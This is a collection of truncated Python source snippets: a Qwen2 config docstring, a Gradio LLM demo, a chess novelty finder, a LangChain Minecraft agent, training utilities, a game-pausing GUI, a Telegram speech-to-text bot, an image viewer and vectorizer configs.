(`int`, *optional*, defaults to 22016):\n            Dimension of the MLP representations.\n        num_hidden_layers (`int`, *optional*, defaults to 32):\n            Number of hidden layers in the Transformer encoder.\n        num_attention_heads (`int`, *optional*, defaults to 32):\n            Number of attention heads for each attention layer in the Transformer encoder.\n        num_key_value_heads (`int`, *optional*, defaults to 32):\n            This is the number of key_value heads that should be used to implement Grouped Query Attention. If\n            `num_key_value_heads=num_attention_heads`, the model will use Multi Head Attention (MHA), if\n            `num_key_value_heads=1 the model will use Multi Query Attention (MQA) otherwise GQA is used. When\n            converting a multi-head checkpoint to a GQA checkpoint, each group key and value head should be constructed\n            by meanpooling all the original heads within that group. For more details checkout [this\n            paper](https://arxiv.org/pdf/2305.13245.pdf). If it is not specified, will default to `32`.\n        hidden_act (`str` or `function`, *optional*, defaults to `\"silu\"`):\n            The non-linear activation function (function or string) in the decoder.\n        max_position_embeddings (`int`, *optional*, defaults to 32768):\n            The maximum sequence length that this model might ever be used with.\n        initializer_range (`float`, *optional*, defaults to 0.02):\n            The standard deviation of the truncated_normal_initializer for initializing all weight matrices.\n        rms_norm_eps (`float`, *optional*, defaults to 1e-06):\n            The epsilon used by the rms normalization layers.\n        use_cache (`bool`, *optional*, defaults to `True`):\n            Whether or not the model should return the last key/values attentions (not used by all models). Only\n            relevant if `config.is_decoder=True`.\n        tie_word_embeddings (`bool`, *optional*, defaults to `False`):\n            Whether the model's input and output word embeddings should be tied.\n        rope_theta (`float`, *optional*, defaults to 10000.0):\n            The base period of the RoPE embeddings.\n        use_sliding_window (`bool`, *optional*, defaults to `False`):\n            Whether to use sliding window attention.\n        sliding_window (`int`, *optional*, defaults to 4096):\n            Sliding window attention (SWA) window size. If not specified, will default to `4096`.\n        max_window_layers (`int`, *optional*, defaults to 28):\n            The number of layers that use SWA (Sliding Window Attention). The bottom layers use SWA while the top use full attention.\n        attention_dropout (`float`, *optional*, defaults to 0.0):\n            The dropout ratio for the attention probabilities.\n\n    ```python\n    >>> from transformers import Qwen2Model, Qwen2Config\n\n    >>> # Initializing a Qwen2 style configuration\n    >>> configuration = Qwen2Config()\n\n    >>> # Initializing a model from the Qwen2-7B style configura",
    "import argparse\nimport torch\n\nimport gradio as gr\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\n\n\ntokenizer, model = None, None\n\n\ndef init_model(args):\n    global tokenizer, model\n    tokenizer = AutoTokenizer.from_pretrained(args.tokenizer_path, truncation_side=\"left\", padding_side=\"left\")\n    model = AutoModelForCausalLM.from_pretrained(args.model_path, trust_remote_code=True, torch_dtype=torch.bfloat16, device_map='auto')\n    model = model.eval()\n\n\ndef batch_call(texts, skip_special_tokens=True, **kwargs):\n    tokenized = tokenizer(texts, padding=True, return_tensors=\"pt\")\n    inputs = {key: value.cuda() for key, value in tokenized.items() if key != 'token_type_ids'}\n    generate_ids = model.generate(**inputs, **kwargs)\n\n    output =[]\n    for tok, gen in zip(tokenized.input_ids, generate_ids):\n        generated = tokenizer.decode(gen[len(tok):], skip_special_tokens=skip_special_tokens)\n        output.append(generated)\n    return output\n\n\ndef text_generation(texts, max_new_tokens, temperature, top_k, top_p):\n    output = batch_call(texts, max_new_tokens=max_new_tokens, do_sample=True, top_k=top_k, top_p=top_p, temperature=temperature, eos_token_id=tokenizer.eos_token_id)\n    return output[0]\n\n\ndef get_args():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--port\", type=int, default=20014,\n                        help=\"server port\")\n    parser.add_argument(\"--model_path\", type=str, default=\"./model\",\n                        help=\"Path to the model. Specifies the file path to the pre-trained model to be used for text generation.\")\n    parser.add_argument(\"--tokenizer_path\", type=str, default=\"./model\",\n                        help=\"Path to the tokenizer.\")\n    args = parser.parse_args()\n    return args\n\n\nif __name__ == \"__main__\":\n    args = get_args()\n\n    # initialize model and tokenizer\n    init_model(args)\n\n    with gr.Blocks() as demo:\n        gr.Markdown(\n            \"# <center>{}</center>\".format(\"XVERSE-MoE-25B Text Generation\"))\n        with gr.Row():\n            with gr.Column():\n                inputs = gr.inputs.Textbox(\n                    lines=5, label=\"Input Text\")  # input\n                with gr.Column():\n                    max_new_tokens = gr.Slider(maximum=512, value=100, minimum=1, step=1,\n                                               label=\"max_new_tokens\", interactive=True)  # max_new_tokens\n                    temperature = gr.Slider(maximum=1.0, value=1.0, minimum=0.0, step=0.05,\n                                            label='temperature', interactive=True)  # temperature\n                    top_k = gr.Slider(maximum=50, value=50, minimum=0, step=1,\n                                      label='Top K', interactive=True)  # top_k\n                    top_p = gr.Slider(maximum=1, value=0.92, minimum=0,\n                                      step=0.02, label='Top P', interactive=True)  # top_p\n\n            with gr.Row():\n                outputs = gr.inputs.Textbox(lines=2, label=\"Output Text\")\n\n        with gr.Row():\n            submit_btn = gr.Button(value=\"\u751f\u6210\", variant=\"secondary\")\n            reset_btn = gr.ClearButton(components=[inputs, outputs], value=\"\u6e05\u9664\", variant=\"secondary\")\n\n        submit_btn.click(fn=text_generation,\n                         inputs=[inputs, max_new_tokens,\n                                 temperature, top_k, top_p],\n                         outputs=outputs)\n\n    demo.launch(server_name=\"0.0.0.0\", server_port=args.port)\n",
    "#!/usr/bin/python3\n#\n# Copyright 2024 Sami Kiminki\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\nfrom enum import Enum\nfrom optparse import OptionParser\nfrom pathlib import Path\nfrom typing import Iterable\nimport berserk\nimport berserk.clients.opening_explorer\nimport berserk.exceptions\nimport chess\nimport chess.engine\nimport chess.pgn\nimport chess.svg\nimport datetime\nimport json\nimport logging\nimport os\nimport sys\nimport time\nimport traceback\n\nVERSION=\"0.2-dev\"\n\n\ndef getDefaultEngineConfPath():\n    if os.name == 'nt':\n        return str(Path.home() / \"AppData\" / \"Roaming\" / \"Nibbler\" / \"engines.json\")\n    else:\n        return str(Path.home() / \".config\" / \"Nibbler\" / \"engines.json\")\n\n\ndef enable_debug_logging(option, opt, value, parser):\n    logging.basicConfig(level=logging.DEBUG)\n\ndef processarguments():\n    parser = OptionParser(\n        version=\"novelty-grinder \" + VERSION,\n        usage = 'usage: novelty-grinder [options] FILE.pgn',\n        description = '''The Grand Novelty Grinder\nsearches for surprise moves and novelties with Lc0 and Lichess.''',\n        epilog='''Quick instructions:\n(1) Configure Lc0 for Nibbler. When using contempt, configure both colors\nseparately.\n(2) Prepare lines or games to analyze in FILE.pgn.\n(3) Run the novelty grinder to find interesting novelties and rarities.\nAnnotated PGN is written in stdout.''')\n\n    parser.add_option(\n        \"-E\", \"--engines-json\", dest=\"enginesJsonPath\",\n        help=\"Nibbler engines.json file [default: %default]\",\n        metavar=\"FILE\",\n        type=\"string\",\n        default=getDefaultEngineConfPath())\n\n    parser.add_option(\n        \"-T\", \"--lichess-token-file\", dest=\"lichessTokenFile\",\n        help=\"Lichess API token file. Optional, may help in case of getting \" +\n        \"API rate-limited. [default: %default]\",\n        metavar=\"FILE\",\n        type=\"string\")\n\n    parser.add_option(\n        \"-w\", \"--white-engine\", dest=\"whiteEngine\",\n        help=\"Engine for white side analysis. Full path can be omitted as long as \" +\n        \"the engine is unambiguous.\",\n        type=\"string\",\n        metavar=\"STR\")\n\n    parser.add_option(\n        \"-b\", \"--black-engine\", dest=\"blackEngine\",\n        help=\"Engine for black side analysis. Full path can be omitted as long as \" +\n        \"the engine is unambiguous.\",\n        metavar=\"STR\")\n\n    parser.add_option(\n        \"-e\", \"--engine\", dest=\"engine\",\n        help=\"Analysis engine for both sides. Full path can be omitted as long as \" +\n        \"the engine is unambiguous.\",\n        type=\"string\",\n        metavar=\"STR\")\n\n    parser.add_option(\n        \"-n\", \"--nodes\", dest=\"analysisNodes\",\n        help=\"Nodes per move to analyze. [default: %default]\",\n        type=\"int\",\n        metavar=\"NODES\",\n        default=100000)\n\n    parser.add_option(\n        \"\",  \"--eval-threshold\", dest=\"evalThresholdCp\",\n        help=\"Engine evaluation score threshold for considering novelties. Moves with at least \" +\n        \"(FIRST_PV_SCORE - EVAL_DIFF) evaluation score are considered for novelties. In centipawns. \" +\n        \"Note: Comparison is against the first PV move, not the highest PV evaluation. \"\n        \"[default: %default]\",\n        type=\"int\",\n        metavar=\"EVAL_DIFF\",\n        default=200)\n\n    parser.add_option(\n        \"\",  \"--rarity-threshold-freq\", dest=\"rarityThresholdFreq\",\n        help=\"Book moves that are played at most FREQ frequency are considered 'rare' moves. \" +\n        \"[default: %default]\",\n        type=\"float\",\n        metavar=\"FREQ\",\n        default=0.05)\n\n    parser.add_option(\n        \"\",  \"--rarity-threshold-count\", dest=\"rarityThresholdCount\",\n        help=\"Book move that is played at most NUM times total are considered 'rare' moves \" +\n        \"regardless of the frequency. [default: %default]\",\n        type=\"int\",\n        metavar=\"NUM\",\n        default=0)\n\n    parser.add_option(\n        \"\",  \"--first-move\", dest=\"firstMove\",\n        help=\"First move to analyze (skip previous). [default: %default]\",\n        type=\"int\",\n        metavar=\"MOVE_NUM\",\n        default=1)\n\n    parser.add_option(\n        \"\",  \"--book-cutoff\", dest=\"bookCutoff\",\n        help=\"Stop analysis when the book has fewer than at most NUM games. \" +\n        \"[default: %default]\",\n        type=\"int\",\n        metavar=\"NUM\",\n        default=2)\n\n    parser.add_option(\n        \"\",  \"--arrows\", dest=\"arrows\", default=False,\n        help=\"Add arrows in the annotated PGN: red = novelty; green = unpopular move.\",\n        action=\"store_true\")\n\n    pars",
    "import time\nfrom langchain.agents import tool, initialize_agent, AgentType\nfrom langchain.callbacks import get_openai_callback\nfrom langchain.load.dump import dumps\n\nimport json\nimport requests\nimport subprocess\nimport logging\nimport datetime\nimport threading\nfrom functools import wraps\nimport os\nimport random\n\ndef timeit(func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        start_time = time.time()\n        result = func(*args, **kwargs)\n        end_time = time.time()\n        \n        # \u786e\u4fdddata\u76ee\u5f55\u5b58\u5728\n        if not os.path.exists(\"data\"):\n            os.makedirs(\"data\")\n        \n        max_try = 3\n        while max_try:\n            try:\n                # action log\n                action_log_path = \"data/action_log.json\"\n                if os.path.exists(action_log_path):\n                    with open(action_log_path, \"r\") as f:\n                        action_log = json.load(f)\n                else:\n                    action_log = {}\n                agent_name = kwargs[\"player_name\"] # \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f agent_name\n                if agent_name not in action_log:\n                    action_log[agent_name] = []\n                \n                # \u6ce8\u610f\uff1aargs, kwargs \u548c result \u9700\u8981\u662f\u53ef\u5e8f\u5217\u5316\u7684\n                action_log[agent_name].append({\n                    \"action\": func.__name__,\n                    # \"time\": datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\"),\n                    \"start_time\": time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(start_time)),\n                    \"end_time\": time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(end_time)),\n                    \"duration\": end_time - start_time,\n                    \"kwargs\": kwargs,  # kwargs \u53ef\u80fd\u5305\u542b\u4e0d\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\n                    \"result\": result,  # result \u53ef\u80fd\u5305\u542b\u4e0d\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\n                })\n                \n                # \u5199\u5165\u6587\u4ef6\n                with open(action_log_path, \"w\") as f:\n                    json.dump(action_log, f, indent=4)\n                break\n            except Exception as e:\n                print(e)\n                max_try -= 1\n                time.sleep(1)\n        \n        return result\n    return wrapper\n\n\nclass Agent():\n    '''\n    Agent is the basic class for the agent in the Minecraft environment.\n    Agent supports high-level and low-level functions for the agent to interact with the Minecraft environment.\n    It works as a bridge between the Minecraft environment and the AI model.\n    '''\n    headers = {'Content-Type': 'application/json'}\n\n    logging.basicConfig()\n    logging.getLogger(\"langchain.retrievers.multi_query\").setLevel(logging.INFO)\n    model = \"gpt-4-1106-preview\"\n    temperature = 0\n    max_tokens = 1024\n    api_key_list = []\n    base_url = \"https://api.chatanywhere.tech/v1\"\n    verbose = True\n\n    name2port = {}\n    agent_process = {}\n    url_prefix = {}\n\n\n    @staticmethod\n    def get_url_prefix() -> dict:\n        if os.path.exists(\"data/url_prefix.json\"):\n            with open(\"data/url_prefix.json\", \"r\") as f:\n                url_prefix = json.load(f)\n        else:\n            url_prefix = {}\n        return url_prefix\n\n    def __init__(self, name, prefix=None, context=None, prompt=None, tools=[], local_port=5000, model=\"\"):\n        self.name = name\n        self.prefix = prefix\n        self.context = context\n        self.prompt = prompt\n        self.local_port = local_port\n        self.model = Agent.model if model == \"\" else model\n        self.basic_tools = [\n            Agent.scanNearbyEntities, Agent.navigateTo, Agent.attackTarget,\n            Agent.UseItemOnEntity, Agent.sleep, Agent.wake,\n            Agent.MineBlock, Agent.placeBlock, Agent.equipItem,\n            Agent.handoverBlock, Agent.SmeltingCooking,\n            Agent.withdrawItem, Agent.storeItem, Agent.craftBlock,\n            Agent.enchantItem, Agent.trade, Agent.repairItem, Agent.eat,\n            Agent.fetchContainerContents, Agent.ToggleAction\n        ]\n        self.all_tools = [\n            Agent.scanNearbyEntities, Agent.navigateTo, Agent.attackTarget,\n            Agent.navigateToBuilding, Agent.navigateToAnimal, Agent.navigateToPlayer,\n            Agent.UseItemOnEntity, Agent.sleep, Agent.wake,\n            Agent.MineBlock, Agent.placeBlock, Agent.equipItem,\n            Agent.tossItem, Agent.talkTo, Agent.handoverBlock,\n            Agent.withdrawItem, Agent.storeItem, Agent.craftBlock,\n            Agent.SmeltingCooking, Agent.erectDirtLadder, Agent.dismantleDirtLadder,\n            Agent.enchantItem, Agent.trade, Agent.repairItem, Agent.eat,\n            Agent.drink, Agent.wear, Agent.layDirtBeam, Agent.removeDirtBeam,\n            Agent.openContainer, Agent.closeContainer,\n            Agent.fetchContainerContents, Agent.ToggleAction,\n            Agent.get_entity_info, Agent.get_environment_info, \n            Agent.performMovement, Agent.lookAt, Agent.startFishing,\n            Agent.stopFishing, Agent.read, Agent.readPage, Agent.write,\n            Agent.mountEntity, Agent.dismountEntity, Agent.rideEntity, Agent.disrideEntity,\n        ]\n        if tools:\n        ",
    "import logging\nimport os\nimport torch\nimport argparse\nimport time\nimport math\nimport torch.distributed as dist\n\n\ndef str2bool(v):\n    if isinstance(v, bool):\n        return v\n    if v.lower() in (\"yes\", \"true\", \"t\", \"y\", \"1\"):\n        return True\n    elif v.lower() in (\"no\", \"false\", \"f\", \"n\", \"0\"):\n        return False\n    else:\n        raise argparse.ArgumentTypeError(\"Boolean value expected.\")\n\n\ndef setuplogger(dir_label, log_paras, time_run, mode, rank):\n    log_code = None\n    if 'train' in mode or 'load' in mode:\n        log_code = 'train'\n    if 'test' in mode:\n        log_code = 'test'\n\n    formatter = logging.Formatter(\"[%(levelname)s %(asctime)s] %(message)s\")\n    Log_file = logging.getLogger('Log_file')\n    Log_screen = logging.getLogger('Log_screen')\n\n    if rank in [-1, 0]:\n        log_path = os.path.join('./logs_' + dir_label + '_' + log_code)\n        if not os.path.exists(log_path):\n            os.makedirs(log_path)\n\n        log_file_name = os.path.join(log_path, 'log_' + log_paras + time_run + '.log')\n        Log_file.setLevel(logging.INFO)\n        Log_screen.setLevel(logging.INFO)\n\n        th = logging.FileHandler(filename=log_file_name, encoding='utf-8')\n        th.setLevel(logging.INFO)\n        th.setFormatter(formatter)\n        Log_file.addHandler(th)\n\n        handler = logging.StreamHandler()\n        handler.setLevel(logging.INFO)\n        handler.setFormatter(formatter)\n\n        Log_screen.addHandler(handler)\n        Log_file.addHandler(handler)\n    else:\n        Log_file.setLevel(logging.WARN)\n        Log_screen.setLevel(logging.WARN)\n    return Log_file, Log_screen\n\n\ndef latest_checkpoint(directory, Log_file):\n    if not os.path.exists(directory):\n        return None\n    Log_file.info(f\"[{os.listdir(directory)}]\")\n    if len(os.listdir(directory)) == 0:\n        return None\n    all_checkpoints = {\n        int(x.split('.')[-2].split('-')[-1]): x\n        for x in os.listdir(directory)\n    }\n    if not all_checkpoints:\n        return None\n    return os.path.join(directory, all_checkpoints[max(all_checkpoints.keys())])\n\n\ndef get_checkpoint(directory, ckpt_name):\n    ckpt_path = os.path.join(directory, ckpt_name)\n    if os.path.exists(ckpt_path):\n        return ckpt_path\n    else:\n        return None\n\n\ndef get_time(start_time, end_time):\n    time_g = int(end_time - start_time)\n    hour = int(time_g / 3600)\n    minu = int(time_g / 60) % 60\n    secon = time_g % 60\n    return hour, minu, secon\n\n\ndef para_and_log(model, seq_num, batch_size, Log_file, logging_num, testing_num):\n    total_num = sum(p.numel() for p in model.module.parameters())\n    trainable_num = sum(p.numel() for p in model.module.parameters() if p.requires_grad)\n    Log_file.info(\"##### total_num {} #####\".format(total_num))\n    Log_file.info(\"##### trainable_num {} #####\".format(trainable_num))\n\n    step_num = math.ceil(seq_num / dist.get_world_size() / batch_size)\n    Log_file.info(\"##### all {} steps #####\".format(step_num))\n    steps_for_log = int(step_num / logging_num)\n    steps_for_test = int(step_num / testing_num)\n    Log_file.info(\"##### {} logs/epoch; {} steps/log #####\".format(logging_num, steps_for_log))\n    Log_file.info(\"##### {} tests/epoch; {} steps/test #####\".format(testing_num, steps_for_test))\n    return steps_for_log, steps_for_test\n\n\ndef save_model(now_epoch, model, model_dir, optimizer, rng_state, cuda_rng_state, Log_file):\n    ckpt_path = os.path.join(model_dir, f'epoch-{now_epoch}.pt')\n    torch.save({'model_state_dict': model.module.state_dict(),\n                'optimizer': optimizer.state_dict(),\n                'rng_state': rng_state,\n                'cuda_rng_state': cuda_rng_state}, ckpt_path)\n    Log_file.info(f\"Model saved to {ckpt_path}\")\n\n\ndef report_time_train(batch_index, now_epoch, loss, next_set_start_time, start_time, Log_file):\n    loss /= batch_index\n    Log_file.info('epoch: {} end, train_loss: {:.5f}'.format(now_epoch, loss.item()))\n    this_set_end_time = time.time()\n    hour, minu, secon = get_time(next_set_start_time, this_set_end_time)\n    Log_file.info(\"##### (time) this epoch set: {} hours {} minutes {} seconds #####\".format(hour, minu, secon))\n    hour, minu, secon = get_time(start_time, this_set_end_time)\n    Log_file.info(\"##### (time) start until now: {} hours {} minutes {} seconds #####\".format(hour, minu, secon))\n    next_set_start_time = time.time()\n    return next_set_start_time\n\n\ndef report_time_eval(start_time, Log_file):\n    end_time = time.time()\n    hour, minu, secon = get_time(start_time, end_time)\n    Log_file.info(\"##### (time) eval(valid and test): {} hours {} minutes {} seconds #####\".format(hour, minu, secon))\n",
    "import dearpygui.dearpygui as dpg\nimport subprocess\n\ndpg.create_context()\ndpg.create_viewport(title=\"pause my game\", width=440, height=480)\n\n# \u516c\u5171\u51fd\u6570\ndef runinsubprocess(thing):\n    creation_flags = subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP |subprocess.CREATE_BREAKAWAY_FROM_JOB\n    subprocess.Popen(thing, shell=True, creationflags=creation_flags,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\n# \u6309\u94ae\u51fd\u6570\ndef loadconfig():\n    with open('game_name.txt', 'r') as f:\n        game_name = f.read().splitlines()\n    dpg.configure_item('game_name_exe', items=game_name)\n    dpg.set_value('infotext' , 'Game loaded: ' + str(len(game_name)) + ' games')\n    # \u81ea\u52a8\u9009\u62e9 \u7b2c\u4e00\u4e2a\n    if len(game_name) > 0:\n        dpg.set_value('game_name_exe', game_name[0])\n\ndef editconfig():\n    runinsubprocess('notepad game_name.txt')\n\ndef pausegame():\n    dpg.configure_item('indicator', default_value='Game Paused' , color=(255,0,0))\n    game_name = dpg.get_value('game_name_exe')\n    runinsubprocess('PsSuspend ' + game_name)\n\ndef resumegame():\n    dpg.configure_item('indicator', default_value='Game Resumed' , color=(0,255,0))\n    game_name = dpg.get_value('game_name_exe')\n    runinsubprocess('PsSuspend -r ' + game_name)\n\ndef opentaskmgr():\n    runinsubprocess('taskmgr')\n\n# \u52a0\u8f7d\u5b57\u4f53\nwith dpg.font_registry():\n    with dpg.font(\"afont.ttf\", 18) as font1:  # \u589e\u52a0\u4e2d\u6587\u7f16\u7801\u8303\u56f4\uff0c\u6570\u5b57\u662f\u5b57\u53f7,\u4f1a\u6bd4\u5b98\u65b9\u5b57\u4f53\u6a21\u7cca\n        # dpg.add_font_range_hint(dpg.mvFontRangeHint_Default)\n        dpg.add_font_range_hint(dpg.mvFontRangeHint_Chinese_Simplified_Common)\n        # dpg.add_font_range_hint(dpg.mvFontRangeHint_Chinese_Full)\n    dpg.bind_font(font1)\n\n# \u7a97\u4f53\u4e3b\u51fd\u6570\nwith dpg.window(label='pauser',  width=400, height=400,pos=(10, 10)):\n    # dpg.add_input_text(default_value='PsSuspend DevilMayCry5.exe' , tag='pause_DevilMayCry5_cmd')\n    # dpg.add_input_text(default_value='PsSuspend -r DevilMayCry5.exe ' , tag='remuse_DevilMayCry5_cmd')\n\n    dpg.add_combo(default_value='' , items=['XXX.exe'], tag='game_name_exe')\n    dpg.add_text(default_value='Game Status untouched' , color=(120,120,120) ,tag='indicator')\n    dpg.add_spacing(count=3)\n\n    dpg.add_button(label='Pause', callback=pausegame);dpg.add_same_line()\n    dpg.add_button(label='Resume', callback=resumegame);dpg.add_same_line()\n    dpg.add_button(label='Taskmgr', callback=opentaskmgr)\n    dpg.add_spacing(count=3)\n    dpg.add_separator()\n    dpg.add_spacing(count=3)\n\n    dpg.add_button(label='reload config', callback=loadconfig);dpg.add_same_line()\n    dpg.add_button(label='edit config', callback=editconfig)\n    dpg.add_text(tag='infotext', default_value='Game loaded:', color=(120,120,120))\n    # dpg.show_documentation()\n# onload \u4e8b\u4ef6\nloadconfig()\n\ndpg.setup_dearpygui()\ndpg.show_viewport()\ndpg.start_dearpygui()\ndpg.destroy_context()",
    "import logging\nimport logging.handlers\nfrom telegram import Update\nfrom telegram.ext import filters, MessageHandler, ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler\nimport os\nimport subprocess\nimport time\nimport dbm\nimport uuid\nimport re\n\nclass ShhBot:\n    API_KEY: str\n    MY_CHAT_ID: str\n    ALLOWED_CHAT_IDS: str\n    WHISPER_MODEL: str\n    WHISPER_OPTIONS: str\n\n    logFormat = \"%(asctime)s - %(name)s - %(levelname)s - %(message)s\"\n    logging.basicConfig(\n        format=logFormat,\n        level=logging.INFO,\n    )\n\n    httpx_logger = logging.getLogger(\"httpx\")\n\n    # Set the logging level to WARNING to ignore INFO and DEBUG logs\n    httpx_logger.setLevel(logging.WARNING)\n\n    def removefile(self, f):\n        try:\n            os.remove(f)\n        except OSError:\n            pass\n\n    def startBot(self):\n        exitt = False\n        if self.API_KEY == None:\n            logging.info(\"SHHH_API_KEY must be defined\")\n            exitt = True\n        logging.info(\"SHHH_MY_CHAT_ID       : %s\", self.MY_CHAT_ID)\n        logging.info(\"SHHH_ALLOWED_CHAT_IDS : %s\", self.ALLOWED_CHAT_IDS)\n        logging.info(\"SHHH_WHISPER_MODEL    : %s\", self.WHISPER_MODEL)\n        logging.info(\"SHHH_WHISPER_OPTIONS  : %s\", self.WHISPER_OPTIONS)\n\n        if not exitt:\n            if self.WHISPER_MODEL != None:\n                logging.log(logging.INFO, \"Download Whisper Model : \" + self.WHISPER_MODEL)\n                outfile = open('/tmp/download.log','w') #same with \"w\" or \"a\" as opening mode\n                cmd = './download.sh'\n                subprocess.run(cmd, stdout=outfile, stderr=outfile,shell=True)\n                outfile.close()\n                with open(\"/tmp/download.log\", \"r\") as f:\n                    contents = f.read()\n                logging.log(logging.INFO, contents)\n\n            application = ApplicationBuilder().token(self.API_KEY).build()\n            logging.info(\"Starting bot\")\n            start_handler = CommandHandler(\"start\", self.start)\n            application.add_handler(start_handler)\n            unknown_handler = MessageHandler(filters.COMMAND, self.unknown)\n            application.add_handler(unknown_handler)\n\n            application.add_handler(MessageHandler(filters.ATTACHMENT, self.handle_message))\n            application.run_polling(allowed_updates=Update.ALL_TYPES)\n            logging.info(\"Bot await messages\")\n        else:\n            logging.info(\"Failed to run, please resolve exports issue and run again\")\n\n    def _esc_char(self,match):\n        return '\\\\' + match.group(0)\n\n    def my_escape(self,name):\n        return re.compile(r'\\s|[]()[]').sub(self._esc_char, name)\n\n    def checkUser(self, chat_id: str, allowed_chat_id_string: str):\n        if allowed_chat_id_string is None:\n            return True\n        allow_list = allowed_chat_id_string.split(' ')\n        if any(chat_id == value for value in allow_list):\n            return True\n\n        logging.info(\"SHHH_ALLOWED_CHAT_IDS : Not processing for %s \\nAllowList %s\", chat_id, allow_list)\n        return False\n\n    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):\n        txt = \"Hi, I'm a bot who wants to help you keep quiet, let me take your voice notes and speech to text them!\"\n        await context.bot.send_message(chat_id=update.effective_chat.id, text=txt)\n        if self.MY_CHAT_ID is not None:\n            await context.bot.send_message(chat_id=self.MY_CHAT_ID, text=txt)\n        logging.info(\"start - effective chat id: %s - txt: %s\", update.effective_chat.id, txt)\n\n    async def unknown(self, update: Update, context: ContextTypes.DEFAULT_TYPE):\n        txt = \"Sorry, I didn't understand that command.\"\n        await context.bot.send_message(chat_id=update.effective_chat.id, text=txt)\n        if self.MY_CHAT_ID is not None:\n            await context.bot.send_message(chat_id=self.MY_CHAT_ID, text=txt)\n        logging.info(\"unknown - effective chat id: %s - txt: %s\", update.effective_chat.id, txt)\n\n    async def handle_message(self, update, context):\n        username = str(update.message.chat.username)\n\n        if not self.checkUser(str(update.effective_chat.id), self.ALLOWED_CHAT_IDS):\n            logging.info(\"Not processing for %s : %s\", username, update.effective_chat.id)\n            if self.MY_CHAT_ID is not None:\n                await context.bot.send_message(chat_id=self.MY_CHAT_ID, text=\"Not processing for {0} : {1}\".format(username,update.effective_chat.id))\n            return\n\n        start = time.time()\n        input_file = \"/tmp/media\"\n        logging.info(\"Started processing for \"+username)\n        if self.MY_CHAT_ID is not None:\n            await context.bot.send_message(chat_id=self.MY_CHAT_ID, text=\"Started processing for \"+username)\n        try:\n            file = await context.bot.get_file(update.message.effective_attachment.file_id)\n\n            # File Size Check 50mb\n            if file.file_size > 50*1024*1024:\n                end = time.time()\n                logging.log(log",
    "import cv2\nimport os\nimport platform\nimport sys\n\ndef display_images_in_folder(folder_path):\n    # Get list of image files\n    image_files = [os.path.join(folder_path, img) for img in os.listdir(folder_path) if img.endswith('.jpg')]\n    \n    # Sort the files for consistency\n    image_files.sort()\n    \n    for img_file in image_files:\n        img = cv2.imread(img_file)\n        if img is None:\n            print(f\"Error loading image: {img_file}\")\n            continue\n        \n        # Resize the image to double resolution\n        img = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_LINEAR)\n        \n        # Get screen resolution\n        screen_width, screen_height = get_screen_resolution()\n        \n        # Calculate window position\n        window_width = img.shape[1]\n        window_height = img.shape[0]\n        x_position = (screen_width - window_width) // 2\n        y_position = (screen_height - window_height) // 2\n\n        # Create a window and display the image\n        cv2.namedWindow('Cluster Images', cv2.WINDOW_NORMAL)\n        cv2.moveWindow('Cluster Images', x_position, y_position)\n        cv2.imshow('Cluster Images', img)\n        cv2.waitKey(250)  # Display for 1 second\n        cv2.destroyAllWindows()\n\ndef get_screen_resolution():\n    # Get screen resolution based on platform\n    screen_width = 0\n    screen_height = 0\n    if platform.system() == \"Windows\":\n        import ctypes\n        user32 = ctypes.windll.user32\n        screen_width = user32.GetSystemMetrics(0)\n        screen_height = user32.GetSystemMetrics(1)\n    elif platform.system() == \"Darwin\":  # macOS\n        screen_width = 1280  # default value if unable to get actual screen resolution\n        screen_height = 720  # default value if unable to get actual screen resolution\n    elif platform.system() == \"Linux\":\n        import subprocess\n        try:\n            output = subprocess.check_output([\"xrandr\"]).decode(\"utf-8\")\n            for line in output.splitlines():\n                if \" connected\" in line:\n                    resolution = line.split()[2]\n                    screen_width, screen_height = map(int, resolution.split(\"x\"))\n                    break\n        except (subprocess.CalledProcessError, IndexError, ValueError):\n            pass\n    return screen_width, screen_height\n\nif __name__ == \"__main__\":\n    # Get folder name \n    folder_name = \"dataset\"\n    folder_path = os.path.join(folder_name)\n\n    # Call the function to display images in the folder\n    display_images_in_folder(folder_path)\n",
    "DEFAULT_CONFIG = {\n    \"vtracer_config\":{\n        \"colormode\":'color',        # [\"color\"] or \"binary\"\n        \"hierarchical\":'stacked',   # [\"stacked\"] or \"cutout\"\n        \"mode\": \"spline\",            # [\"spline\"] \"polygon\", or \"none\"\n        \"filter_speckle\": 4,         # default: 4\n        \"color_precision\": 6,        # default: 6\n        \"layer_difference\": 16,      # default: 16 \"increase this on abstract image\"\n        \"corner_threshold\": 60,      # default: 60\n        \"length_threshold\": 4,     # in [3.5, 10] default: 4.0\n        \"max_iterations\": 10,        # default: 10\n        \"splice_threshold\": 45,      # default: 45\n        \"path_precision\": 8          # default: 8\n    },\n    \"min_area_ratio\": None, # min area = 16\n    \"resize_width\": None, # resize image before translation\n    \"rescale_width\": None, # resize SVG to a specific width\n    \"if_resize\": True,\n    \"if_post_process\": True,\n    \"simplify_threshold\": None,\n    \"truncate_len\": None\n}\n\nCONFIGS = {\n    \"pvd\": {\n        \"vtracer_config\":{\n            \"colormode\":'color',        # [\"color\"] or \"binary\"\n            \"hierarchical\":'stacked',   # [\"stacked\"] or \"cutout\"\n            \"mode\": \"polygon\",            # [\"spline\"] \"polygon\", or \"none\"\n            \"filter_speckle\": 4,         # default: 4\n            \"color_precision\": 6,        # default: 6\n            \"layer_difference\": 16,      # default: 16\n            \"corner_threshold\": 60,      # default: 60\n            \"length_threshold\": 4,     # in [3.5, 10] default: 4.0\n            